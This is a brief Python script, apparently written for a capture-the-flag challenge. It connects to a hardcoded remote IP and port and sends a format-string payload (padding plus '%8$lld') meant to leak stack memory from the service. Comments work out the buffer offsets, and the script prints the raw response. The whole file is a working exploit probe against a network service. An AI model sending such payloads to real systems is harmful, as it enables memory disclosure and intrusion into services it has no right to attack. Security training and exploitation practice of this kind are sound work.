#!/usr/bin/env python3
import socket, time, re
HOST="144.79.188.39"; PORT=43642
def newconn():
    s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300); return s
s=newconn()
# format at buffer[0:16], pattern "BCDEFGH" split so buffer[16:23]="BCDEFGH"? 
# buffer[16:22]=6 bytes "BCDEFG", buffer[22]="H", buffer[23]=OOB. arg8=BCDEFGH+buffer[23]
payload = b"AAAAAAAAAA" + b"%8$lld" + b"BCDEFG" + b"H"   # 10+6+6+1 = 23
s.send(payload)
time.sleep(0.3)
d=b''
try:
    while True:
        c=s.recv(4096)
        if not c: break
        d+=c
except Exception: pass
print("raw:", repr(d))
s.close()
